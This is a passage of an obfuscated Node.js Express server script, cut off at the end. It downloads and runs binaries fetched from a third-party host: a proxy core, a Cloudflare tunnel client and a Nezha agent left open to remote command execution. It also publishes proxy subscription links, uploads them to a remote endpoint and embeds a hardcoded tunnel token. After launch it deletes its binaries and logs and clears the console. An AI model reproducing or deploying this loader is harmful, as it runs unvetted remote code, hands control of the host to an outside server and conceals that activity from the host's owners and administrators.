const _0xb8fcf7=_0x393c;function _0x393c(_0x39136a,_0x619783){_0x39136a=_0x39136a-0x1d1;const _0x3ac9a3=_0x3ac9();let _0x393c42=_0x3ac9a3[_0x39136a];return _0x393c42;}(function(_0x112404,_0x27e7e4){const _0x57b4e3=_0x393c,_0x3e988c=_0x112404();while(!![]){try{const _0x7a2ee6=parseInt(_0x57b4e3(0x23b))/0x1+parseInt(_0x57b4e3(0x1fd))/0x2*(parseInt(_0x57b4e3(0x275))/0x3)+-parseInt(_0x57b4e3(0x22f))/0x4*(parseInt(_0x57b4e3(0x237))/0x5)+parseInt(_0x57b4e3(0x288))/0x6+parseInt(_0x57b4e3(0x27a))/0x7+parseInt(_0x57b4e3(0x253))/0x8*(-parseInt(_0x57b4e3(0x1f0))/0x9)+parseInt(_0x57b4e3(0x286))/0xa*(-parseInt(_0x57b4e3(0x274))/0xb);if(_0x7a2ee6===_0x27e7e4)break;else _0x3e988c['push'](_0x3e988c['shift']());}catch(_0x551b9e){_0x3e988c['push'](_0x3e988c['shift']());}}}(_0x3ac9,0x748e2));const express=require('express'),app=express(),axios=require(_0xb8fcf7(0x223)),os=require('os'),fs=require('fs'),path=require(_0xb8fcf7(0x23f)),{promisify}=require(_0xb8fcf7(0x20c)),exec=promisify(require(_0xb8fcf7(0x1db))['exec']),UPLOAD_URL=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x259)]||'',PROJECT_URL=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x268)]||'',AUTO_ACCESS=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x23c)]||![],FILE_PATH=process[_0xb8fcf7(0x1fc)]['FILE_PATH']||_0xb8fcf7(0x229),SUB_PATH=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x26b)]||_0xb8fcf7(0x234),PORT=process[_0xb8fcf7(0x1fc)]['SERVER_PORT']||process['env'][_0xb8fcf7(0x257)]||0xbb8,UUID=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x26c)]||_0xb8fcf7(0x22d),NEZHA_SERVER=process['env'][_0xb8fcf7(0x1f9)]||'',NEZHA_PORT=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x1d9)]||'',NEZHA_KEY=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x1e5)]||'',ARGO_DOMAIN=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x24d)]||_0xb8fcf7(0x200),ARGO_AUTH=process['env'][_0xb8fcf7(0x240)]||_0xb8fcf7(0x252),ARGO_PORT=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x202)]||0x1f41,CFIP=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x205)]||_0xb8fcf7(0x289),CFPORT=process[_0xb8fcf7(0x1fc)][_0xb8fcf7(0x213)]||0x1bb,NAME=process[_0xb8fcf7(0x1fc)]['NAME']||'leaflow2026';!fs[_0xb8fcf7(0x1dd)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0xb8fcf7(0x26d)](FILE_PATH+_0xb8fcf7(0x228))):console[_0xb8fcf7(0x26d)](FILE_PATH+_0xb8fcf7(0x1ff));function generateRandomName(){const _0x2b47b5=_0xb8fcf7,_0x5ae31a='abcdefghijklmnopqrstuvwxyz';let _0x312bfd='';for(let _0x41fe56=0x0;_0x41fe56<0x6;_0x41fe56++){_0x312bfd+=_0x5ae31a[_0x2b47b5(0x263)](Math[_0x2b47b5(0x20e)](Math[_0x2b47b5(0x1f7)]()*_0x5ae31a[_0x2b47b5(0x1f3)]));}return _0x312bfd;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xb8fcf7(0x25e)](FILE_PATH,npmName),phpPath=path[_0xb8fcf7(0x25e)](FILE_PATH,phpName),webPath=path[_0xb8fcf7(0x25e)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0xb8fcf7(0x25e)](FILE_PATH,_0xb8fcf7(0x207)),listPath=path[_0xb8fcf7(0x25e)](FILE_PATH,_0xb8fcf7(0x24c)),bootLogPath=path[_0xb8fcf7(0x25e)](FILE_PATH,_0xb8fcf7(0x1d4)),configPath=path[_0xb8fcf7(0x25e)](FILE_PATH,_0xb8fcf7(0x290));function deleteNodes(){const _0x15a545=_0xb8fcf7;try{if(!UPLOAD_URL)return;if(!fs[_0x15a545(0x1dd)](subPath))return;let _0x35ca91;try{_0x35ca91=fs[_0x15a545(0x260)](subPath,_0x15a545(0x222));}catch{return null;}const _0x6bc334=Buffer[_0x15a545(0x1f1)](_0x35ca91,'base64')[_0x15a545(0x1f4)](_0x15a545(0x222)),_0x4d6897=_0x6bc334[_0x15a545(0x236)]('\x0a')[_0x15a545(0x284)](_0x54ccd8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x15a545(0x235)](_0x54ccd8));if(_0x4d6897['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x15a545(0x255),JSON[_0x15a545(0x28b)]({'nodes':_0x4d6897}),{'headers':{'Content-Type':_0x15a545(0x256)}})[_0x15a545(0x214)](_0xcbdb0=>{return null;}),null;}catch(_0x16840c){return null;}}function cleanupOldFiles(){const _0x56bcd4=_0xb8fcf7;try{const _0x1fd1ca=fs['readdirSync'](FILE_PATH);_0x1fd1ca[_0x56bcd4(0x20d)](_0x33fa19=>{const _0x53a890=_0x56bcd4,_0x5e32cc=path['join'](FILE_PATH,_0x33fa19);try{const _0x5cb0cf=fs[_0x53a890(0x219)](_0x5e32cc);_0x5cb0cf['isFile']()&&fs[_0x53a890(0x1d7)](_0x5e32cc);}catch(_0x49c88e){}});}catch(_0x5a0beb){}}async function generateConfig(){const _0x4ac0b1=_0xb8fcf7,_0x170cb7={'log':{'access':_0x4ac0b1(0x249),'error':_0x4ac0b1(0x249),'loglevel':_0x4ac0b1(0x23d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4ac0b1(0x1f8),'settings':{'clients':[{'id':UUID,'flow':_0x4ac0b1(0x27d)}],'decryption':_0x4ac0b1(0x23d),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x4ac0b1(0x25f),'dest':0xbbb},{'path':_0x4ac0b1(0x212),'dest':0xbbc}]},'streamSettings':{'network':_0x4ac0b1(0x247)}},{'port':0xbb9,'listen':_0x4ac0b1(0x294),'protocol':_0x4ac0b1(0x1f8),'settings':{'clients':[{'id':UUID}],'decryption':_0x4ac0b1(0x23d)},'streamSettings':{'network':_0x4ac0b1(0x247),'security':_0x4ac0b1(0x23d)}},{'port':0xbba,'listen':_0x4ac0b1(0x294),'protocol':_0x4ac0b1(0x1f8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4ac0b1(0x23d)},'streamSettings':{'network':'ws','security':_0x4ac0b1(0x23d),'wsSettings':{'path':_0x4ac0b1(0x1ea)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x4ac0b1(0x230)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4ac0b1(0x1ee),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4ac0b1(0x25f)}},'sniffing':{'enabled':!![],'destOverride':[_0x4ac0b1(0x1fe),_0x4ac0b1(0x1ed),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4ac0b1(0x294),'protocol':_0x4ac0b1(0x1eb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4ac0b1(0x23d),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x4ac0b1(0x230)],'metadataOnly':![]}}],'dns':{'servers':[_0x4ac0b1(0x204)]},'outbounds':[{'protocol':_0x4ac0b1(0x1df),'tag':_0x4ac0b1(0x248)},{'protocol':_0x4ac0b1(0x281),'tag':_0x4ac0b1(0x28f)}]};fs[_0x4ac0b1(0x254)](path[_0x4ac0b1(0x25e)](FILE_PATH,'config.json'),JSON[_0x4ac0b1(0x28b)](_0x170cb7,null,0x2));}function getSystemArchitecture(){const _0x52b6e2=_0xb8fcf7,_0x5a4205=os[_0x52b6e2(0x24f)]();return _0x5a4205===_0x52b6e2(0x22b)||_0x5a4205===_0x52b6e2(0x28c)||_0x5a4205==='aarch64'?_0x52b6e2(0x22b):_0x52b6e2(0x1d6);}function downloadFile(_0x2c5447,_0x252db4,_0x202224){const _0x1c04cc=_0xb8fcf7,_0x2dc3fd=_0x2c5447;!fs[_0x1c04cc(0x1dd)](FILE_PATH)&&fs[_0x1c04cc(0x272)](FILE_PATH,{'recursive':!![]});const _0x35734c=fs[_0x1c04cc(0x279)](_0x2dc3fd);axios({'method':_0x1c04cc(0x20b),'url':_0x252db4,'responseType':_0x1c04cc(0x278)})[_0x1c04cc(0x1d2)](_0x5630da=>{const _0x15e7fb=_0x1c04cc;_0x5630da[_0x15e7fb(0x269)][_0x15e7fb(0x22e)](_0x35734c),_0x35734c['on']('finish',()=>{const _0x3964dc=_0x15e7fb;_0x35734c[_0x3964dc(0x22a)](),console[_0x3964dc(0x26d)](_0x3964dc(0x203)+path[_0x3964dc(0x211)](_0x2dc3fd)+_0x3964dc(0x21b)),_0x202224(null,_0x2dc3fd);}),_0x35734c['on'](_0x15e7fb(0x25d),_0x5920a6=>{const _0x598216=_0x15e7fb;fs['unlink'](_0x2dc3fd,()=>{});const _0x1144b8=_0x598216(0x203)+path[_0x598216(0x211)](_0x2dc3fd)+_0x598216(0x23e)+_0x5920a6[_0x598216(0x24e)];console[_0x598216(0x25d)](_0x1144b8),_0x202224(_0x1144b8);});})[_0x1c04cc(0x214)](_0x340401=>{const _0x460af4=_0x1c04cc,_0x1ae5c5=_0x460af4(0x203)+path[_0x460af4(0x211)](_0x2dc3fd)+'\x20failed:\x20'+_0x340401[_0x460af4(0x24e)];console[_0x460af4(0x25d)](_0x1ae5c5),_0x202224(_0x1ae5c5);});}async function downloadFilesAndRun(){const _0x52e1f0=_0xb8fcf7,_0x58b54d=getSystemArchitecture(),_0x44457a=getFilesForArchitecture(_0x58b54d);if(_0x44457a[_0x52e1f0(0x1f3)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x4aaa8e=_0x44457a[_0x52e1f0(0x201)](_0x4b4cc9=>{return new Promise((_0x5822c3,_0x2a6f6b)=>{const _0x43792e=_0x393c;downloadFile(_0x4b4cc9[_0x43792e(0x267)],_0x4b4cc9['fileUrl'],(_0x2d6360,_0x49e538)=>{_0x2d6360?_0x2a6f6b(_0x2d6360):_0x5822c3(_0x49e538);});});});try{await Promise['all'](_0x4aaa8e);}catch(_0x44ddb1){console['error'](_0x52e1f0(0x24a),_0x44ddb1);return;}function _0x3156b1(_0x4519f7){const _0x6ecebe=_0x52e1f0,_0x4833d3=0x1fd;_0x4519f7[_0x6ecebe(0x20d)](_0x528a28=>{const _0xdec1f6=_0x6ecebe;fs[_0xdec1f6(0x1dd)](_0x528a28)&&fs[_0xdec1f6(0x287)](_0x528a28,_0x4833d3,_0x1f664b=>{const _0x1923bf=_0xdec1f6;_0x1f664b?console[_0x1923bf(0x25d)](_0x1923bf(0x1da)+_0x528a28+':\x20'+_0x1f664b):console['log'](_0x1923bf(0x220)+_0x528a28+':\x20'+_0x4833d3[_0x1923bf(0x1f4)](0x8));});});}const _0x45e44c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3156b1(_0x45e44c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x31ab27=NEZHA_SERVER[_0x52e1f0(0x244)](':')?NEZHA_SERVER['split'](':')[_0x52e1f0(0x1e8)]():'',_0x55e894=new Set([_0x52e1f0(0x231),'8443',_0x52e1f0(0x282),_0x52e1f0(0x28d),'2083',_0x52e1f0(0x226)]),_0x302fb5=_0x55e894[_0x52e1f0(0x295)](_0x31ab27)?_0x52e1f0(0x227):_0x52e1f0(0x1e1),_0x44705e='\x0a\x20\x20client_secret:\x20'+NEZHA_KEY+'\x0a\x20\x20debug:\x20false\x0a\x20\x20disable_auto_update:\x20true\x0a\x20\x20disable_command_execute:\x20false\x0a\x20\x20disable_force_update:\x20true\x0a\x20\x20disable_nat:\x20false\x0a\x20\x20disable_send_query:\x20false\x0a\x20\x20gpu:\x20false\x0a\x20\x20insecure_tls:\x20true\x0a\x20\x20ip_report_period:\x201800\x0a\x20\x20report_delay:\x204\x0a\x20\x20server:\x20'+NEZHA_SERVER+'\x0a\x20\x20skip_connection_count:\x20true\x0a\x20\x20skip_procs_count:\x20true\x0a\x20\x20temperature:\x20false\x0a\x20\x20tls:\x20'+_0x302fb5+'\x0a\x20\x20use_gitee_to_upgrade:\x20false\x0a\x20\x20use_ipv6_country_code:\x20false\x0a\x20\x20uuid:\x20'+UUID;fs[_0x52e1f0(0x254)](path[_0x52e1f0(0x25e)](FILE_PATH,'config.yaml'),_0x44705e);const _0x4b668f=_0x52e1f0(0x28e)+phpPath+_0x52e1f0(0x27b)+FILE_PATH+_0x52e1f0(0x1fa);try{await exec(_0x4b668f),console[_0x52e1f0(0x26d)](phpName+_0x52e1f0(0x280)),await new Promise(_0x317992=>setTimeout(_0x317992,0x3e8));}catch(_0xccc409){console[_0x52e1f0(0x25d)](_0x52e1f0(0x24b)+_0xccc409);}}else{let _0x3d3dac='';const _0x822e82=[_0x52e1f0(0x231),'8443','2096',_0x52e1f0(0x28d),_0x52e1f0(0x209),_0x52e1f0(0x226)];_0x822e82[_0x52e1f0(0x244)](NEZHA_PORT)&&(_0x3d3dac=_0x52e1f0(0x210));const _0x3117e9='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3d3dac+_0x52e1f0(0x27e);try{await exec(_0x3117e9),console[_0x52e1f0(0x26d)](npmName+_0x52e1f0(0x280)),await new Promise(_0x4eddfe=>setTimeout(_0x4eddfe,0x3e8));}catch(_0x58b56a){console[_0x52e1f0(0x25d)](_0x52e1f0(0x1e0)+_0x58b56a);}}}else console[_0x52e1f0(0x26d)](_0x52e1f0(0x258));const _0x38c261=_0x52e1f0(0x28e)+webPath+_0x52e1f0(0x26e)+FILE_PATH+_0x52e1f0(0x243);try{await exec(_0x38c261),console['log'](webName+_0x52e1f0(0x280)),await new Promise(_0x3d7c31=>setTimeout(_0x3d7c31,0x3e8));}catch(_0x852bb6){console['error'](_0x52e1f0(0x232)+_0x852bb6);}if(fs[_0x52e1f0(0x1dd)](botPath)){let _0xa2a461;if(ARGO_AUTH[_0x52e1f0(0x1e6)](/^[A-Z0-9a-z=]{120,250}$/))_0xa2a461=_0x52e1f0(0x262)+ARGO_AUTH;else ARGO_AUTH[_0x52e1f0(0x1e6)](/TunnelSecret/)?_0xa2a461=_0x52e1f0(0x246)+FILE_PATH+_0x52e1f0(0x296):_0xa2a461=_0x52e1f0(0x215)+FILE_PATH+_0x52e1f0(0x277)+ARGO_PORT;try{await exec(_0x52e1f0(0x28e)+botPath+'\x20'+_0xa2a461+_0x52e1f0(0x1de)),console[_0x52e1f0(0x26d)](botName+'\x20is\x20running'),await new Promise(_0x5e64da=>setTimeout(_0x5e64da,0x7d0));}catch(_0x5d06d9){console[_0x52e1f0(0x25d)](_0x52e1f0(0x283)+_0x5d06d9);}}await new Promise(_0x1c3063=>setTimeout(_0x1c3063,0x1388));}function getFilesForArchitecture(_0x4aa25f){const _0x52ef81=_0xb8fcf7;let _0x2cfbc9;_0x4aa25f===_0x52ef81(0x22b)?_0x2cfbc9=[{'fileName':webPath,'fileUrl':_0x52ef81(0x1fb)},{'fileName':botPath,'fileUrl':_0x52ef81(0x270)}]:_0x2cfbc9=[{'fileName':webPath,'fileUrl':_0x52ef81(0x20a)},{'fileName':botPath,'fileUrl':_0x52ef81(0x242)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3db00f=_0x4aa25f===_0x52ef81(0x22b)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x2cfbc9['unshift']({'fileName':npmPath,'fileUrl':_0x3db00f});}else{const _0x3a96de=_0x4aa25f==='arm'?_0x52ef81(0x25b):_0x52ef81(0x26f);_0x2cfbc9['unshift']({'fileName':phpPath,'fileUrl':_0x3a96de});}}return _0x2cfbc9;}function argoType(){const _0x45af9d=_0xb8fcf7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x45af9d(0x26d)](_0x45af9d(0x1d1));return;}if(ARGO_AUTH['includes'](_0x45af9d(0x22c))){fs[_0x45af9d(0x254)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x530bb4=_0x45af9d(0x1e2)+ARGO_AUTH[_0x45af9d(0x236)]('\x22')[0xb]+_0x45af9d(0x25a)+path[_0x45af9d(0x25e)](FILE_PATH,_0x45af9d(0x285))+_0x45af9d(0x21a)+ARGO_DOMAIN+_0x45af9d(0x20f)+ARGO_PORT+_0x45af9d(0x292);fs[_0x45af9d(0x254)](path['join'](FILE_PATH,_0x45af9d(0x1dc)),_0x530bb4);}else console[_0x45af9d(0x26d)](_0x45af9d(0x216));}async function extractDomains(){const _0x1787ab=_0xb8fcf7;let _0x34272e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x34272e=ARGO_DOMAIN,console[_0x1787ab(0x26d)](_0x1787ab(0x21d),_0x34272e),await _0x18d4d1(_0x34272e);else try{const _0x4429f3=fs[_0x1787ab(0x260)](path[_0x1787ab(0x25e)](FILE_PATH,_0x1787ab(0x1d4)),_0x1787ab(0x222)),_0x7d73a3=_0x4429f3[_0x1787ab(0x236)]('\x0a'),_0xc8df32=[];_0x7d73a3['forEach'](_0x59997f=>{const _0x3d824c=_0x1787ab,_0x206e14=_0x59997f[_0x3d824c(0x1e6)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x206e14){const _0x116293=_0x206e14[0x1];_0xc8df32[_0x3d824c(0x208)](_0x116293);}});if(_0xc8df32[_0x1787ab(0x1f3)]>0x0)_0x34272e=_0xc8df32[0x0],console[_0x1787ab(0x26d)]('ArgoDomain:',_0x34272e),await _0x18d4d1(_0x34272e);else{console[_0x1787ab(0x26d)](_0x1787ab(0x1d8)),fs['unlinkSync'](path[_0x1787ab(0x25e)](FILE_PATH,_0x1787ab(0x1d4)));async function _0x6f02f(){const _0x5e6604=_0x1787ab;try{process['platform']===_0x5e6604(0x233)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x5e6604(0x27f)):await exec(_0x5e6604(0x1e7)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2f9b1e){}}_0x6f02f(),await new Promise(_0x33f4e3=>setTimeout(_0x33f4e3,0xbb8));const _0x17e26e=_0x1787ab(0x215)+FILE_PATH+_0x1787ab(0x277)+ARGO_PORT;try{await exec(_0x1787ab(0x28e)+botPath+'\x20'+_0x17e26e+_0x1787ab(0x1de)),console[_0x1787ab(0x26d)](botName+_0x1787ab(0x280)),await new Promise(_0x2cd731=>setTimeout(_0x2cd731,0xbb8)),await extractDomains();}catch(_0x38312f){console[_0x1787ab(0x25d)](_0x1787ab(0x283)+_0x38312f);}}}catch(_0x51215f){console[_0x1787ab(0x25d)]('Error\x20reading\x20boot.log:',_0x51215f);}async function _0x36e433(){const _0x494fe0=_0x1787ab;try{const _0x234073=await axios['get'](_0x494fe0(0x28a),{'timeout':0xbb8});if(_0x234073[_0x494fe0(0x269)]&&_0x234073[_0x494fe0(0x269)]['country_code']&&_0x234073[_0x494fe0(0x269)]['org'])return _0x234073[_0x494fe0(0x269)][_0x494fe0(0x1f2)]+'_'+_0x234073[_0x494fe0(0x269)][_0x494fe0(0x1d5)];}catch(_0x39a313){try{const _0x1c086a=await axios['get'](_0x494fe0(0x265),{'timeout':0xbb8});if(_0x1c086a['data']&&_0x1c086a[_0x494fe0(0x269)]['status']===_0x494fe0(0x251)&&_0x1c086a['data'][_0x494fe0(0x261)]&&_0x1c086a[_0x494fe0(0x269)][_0x494fe0(0x1d5)])return _0x1c086a[_0x494fe0(0x269)][_0x494fe0(0x261)]+'_'+_0x1c086a['data'][_0x494fe0(0x1d5)];}catch(_0x2dc5c1){}}return'Unknown';}async function _0x18d4d1(_0x3be30a){const _0x18c07d=await _0x36e433(),_0x29ae5e=NAME?NAME+'-'+_0x18c07d:_0x18c07d;return new Promise(_0x235f27=>{setTimeout(()=>{const _0x27cf14=_0x393c,_0x28a490={'v':'2','ps':''+_0x29ae5e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x27cf14(0x23d),'net':'ws','type':_0x27cf14(0x23d),'host':_0x3be30a,'path':'/vmess-argo?ed=2560','tls':_0x27cf14(0x1ed),'sni':_0x3be30a,'alpn':'','fp':_0x27cf14(0x1ef)},_0x352ac6=_0x27cf14(0x264)+UUID+'@'+CFIP+':'+CFPORT+_0x27cf14(0x218)+_0x3be30a+'&fp=firefox&type=ws&host='+_0x3be30a+_0x27cf14(0x276)+_0x29ae5e+'\x0a\x20\x20\x0a\x20\x20vmess://'+Buffer[_0x27cf14(0x1f1)](JSON[_0x27cf14(0x28b)](_0x28a490))[_0x27cf14(0x1f4)]('base64')+_0x27cf14(0x1e4)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x3be30a+_0x27cf14(0x1e3)+_0x3be30a+_0x27cf14(0x23a)+_0x29ae5e+'\x0a\x20\x20\x20\x20\x20\x20';console['log'](Buffer['from'](_0x352ac6)['toString']('base64')),fs['writeFileSync'](subPath,Buffer['from'](_0x352ac6)[_0x27cf14(0x1f4)](_0x27cf14(0x1f5))),console['log'](FILE_PATH+_0x27cf14(0x273)),uploadNodes(),app[_0x27cf14(0x20b)]('/'+SUB_PATH,(_0x4c5e39,_0x43f6e9)=>{const _0x100cd1=_0x27cf14,_0x4da029=Buffer[_0x100cd1(0x1f1)](_0x352ac6)[_0x100cd1(0x1f4)](_0x100cd1(0x1f5));_0x43f6e9['set']('Content-Type',_0x100cd1(0x1ec)),_0x43f6e9[_0x100cd1(0x21f)](_0x4da029);}),_0x235f27(_0x352ac6);},0x7d0);});}}function _0x3ac9(){const _0xa9ee0b=['floor','\x0a\x20\x20\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','--tls','basename','/trojan-argo','CFPORT','catch','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','index.html','?encryption=none&security=tls&sni=','statSync','\x0a\x20\x20\x20\x20protocol:\x20http2\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20ingress:\x0a\x20\x20\x20\x20\x20\x20-\x20hostname:\x20','\x20successfully','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ARGO_DOMAIN:','clear','send','Empowerment\x20success\x20for\x20','readFile','utf-8','axios','https://oooo.serv00.net/add-url','/api/add-subscriptions','2053','true','\x20is\x20created','.tmp','close','arm','TunnelSecret','38908bd8-6fe3-4944-9df9-beb9e5287a93','pipe','4rAqfFG','quic','443','web\x20running\x20error:\x20','win32','hello','test','split','2075930NTzBPp','/api/add-nodes','Add\x20automatic\x20access\x20task\x20faild:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','904527iUuArh','AUTO_ACCESS','none','\x20failed:\x20','path','ARGO_AUTH','rm\x20-rf\x20','https://amd64.ssss.nyc.mn/bot','/config.json\x20>/dev/null\x202>&1\x20&','includes','platform','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tcp','direct','/dev/null','Error\x20downloading\x20files:','php\x20running\x20error:\x20','list.txt','ARGO_DOMAIN','message','arch','status','success','eyJhIjoiYzJlOWMzYmJhOWJmMjIzNTcwOTczZjAyNDIxOGIwZjQiLCJ0IjoiZTIxNzE2ODItOThjOS00M2ExLThhOTMtNzVlMjc4MTIyYWEzIiwicyI6IlpXRTRPVFJrT0dNdE1ESTRaQzAwWlRFekxUZ3hNbUl0TTJRNU9USTVOMkk1T0ROaSJ9','680ClajAD','writeFileSync','/api/delete-nodes','application/json','PORT','NEZHA\x20variable\x20is\x20empty,skip\x20running','UPLOAD_URL','\x0a\x20\x20\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/v1','Error\x20in\x20startserver:','error','join','/vmess-argo','readFileSync','countryCode','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','charAt','\x0a\x20\x20vless://','http://ip-api.com/json','utf8','fileName','PROJECT_URL','data','listen','SUB_PATH','UUID','log','\x20-c\x20','https://amd64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/bot','Nodes\x20uploaded\x20successfully','mkdirSync','/sub.txt\x20saved\x20successfully','671dKoser','15123weWOlr','&path=%2Fvless-argo%3Fed%3D2560#','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','stream','createWriteStream','2021229cVFupI','\x20-c\x20\x22','App\x20is\x20running','xtls-rprx-vision','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','.exe\x20>\x20nul\x202>&1','\x20is\x20running','blackhole','2096','Error\x20executing\x20command:\x20','filter','tunnel.json','91820iGephk','chmod','1512882KNyyob','ntu.edu.sg','https://ipapi.co/json','stringify','arm64','2087','nohup\x20','block','config.json','\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20\x20\x20','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','127.0.0.1','has','/tunnel.yml\x20run','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','then','Unhandled\x20error\x20in\x20startserver:','boot.log','org','amd','unlinkSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','NEZHA_PORT','Empowerment\x20failed\x20for\x20','child_process','tunnel.yml','existsSync','\x20>/dev/null\x202>&1\x20&','freedom','npm\x20running\x20error:\x20','false','\x0a\x20\x20\x20\x20tunnel:\x20','&fp=firefox&type=ws&host=','\x0a\x20\x20\x0a\x20\x20trojan://','NEZHA_KEY','match','pkill\x20-f\x20\x22[','pop','post','/vless-argo','trojan','text/plain;\x20charset=utf-8','tls','vmess','firefox','297bEPDPr','from','country_code','length','toString','base64','\x20>/dev/null\x202>&1','random','vless','NEZHA_SERVER','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/web','env','4gQwJXp','http','\x20already\x20exists','leaflow.quicker.cc.cd','map','ARGO_PORT','Download\x20','https+local://8.8.8.8/dns-query','CFIP','Subscription\x20uploaded\x20successfully','sub.txt','push','2083','https://amd64.ssss.nyc.mn/web','get','util','forEach'];_0x3ac9=function(){return _0xa9ee0b;};return _0x3ac9();}async function uploadNodes(){const _0x7d8682=_0xb8fcf7;if(UPLOAD_URL&&PROJECT_URL){const _0x3a0117=PROJECT_URL+'/'+SUB_PATH,_0x47b9f6={'subscription':[_0x3a0117]};try{const _0x5b1664=await axios[_0x7d8682(0x1e9)](UPLOAD_URL+_0x7d8682(0x225),_0x47b9f6,{'headers':{'Content-Type':_0x7d8682(0x256)}});return _0x5b1664&&_0x5b1664['status']===0xc8?(console[_0x7d8682(0x26d)](_0x7d8682(0x206)),_0x5b1664):null;}catch(_0x365459){if(_0x365459['response']){if(_0x365459['response'][_0x7d8682(0x250)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x37a3f0=fs[_0x7d8682(0x260)](listPath,_0x7d8682(0x222)),_0x3ac999=_0x37a3f0[_0x7d8682(0x236)]('\x0a')[_0x7d8682(0x284)](_0x14680b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x7d8682(0x235)](_0x14680b));if(_0x3ac999[_0x7d8682(0x1f3)]===0x0)return;const _0x3e81c1=JSON[_0x7d8682(0x28b)]({'nodes':_0x3ac999});try{const _0x296fab=await axios['post'](UPLOAD_URL+_0x7d8682(0x238),_0x3e81c1,{'headers':{'Content-Type':_0x7d8682(0x256)}});return _0x296fab&&_0x296fab[_0x7d8682(0x250)]===0xc8?(console[_0x7d8682(0x26d)](_0x7d8682(0x271)),_0x296fab):null;}catch(_0x23fc40){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x536cb1=_0x393c,_0x4780b5=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4780b5['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4780b5[_0x536cb1(0x208)](phpPath);process[_0x536cb1(0x245)]===_0x536cb1(0x233)?exec('del\x20/f\x20/q\x20'+_0x4780b5[_0x536cb1(0x25e)]('\x20')+_0x536cb1(0x291),_0x215004=>{const _0x556ce7=_0x536cb1;console[_0x556ce7(0x21e)](),console[_0x556ce7(0x26d)](_0x556ce7(0x27c)),console['log'](_0x556ce7(0x21c));}):exec(_0x536cb1(0x241)+_0x4780b5[_0x536cb1(0x25e)]('\x20')+_0x536cb1(0x1f6),_0x205237=>{const 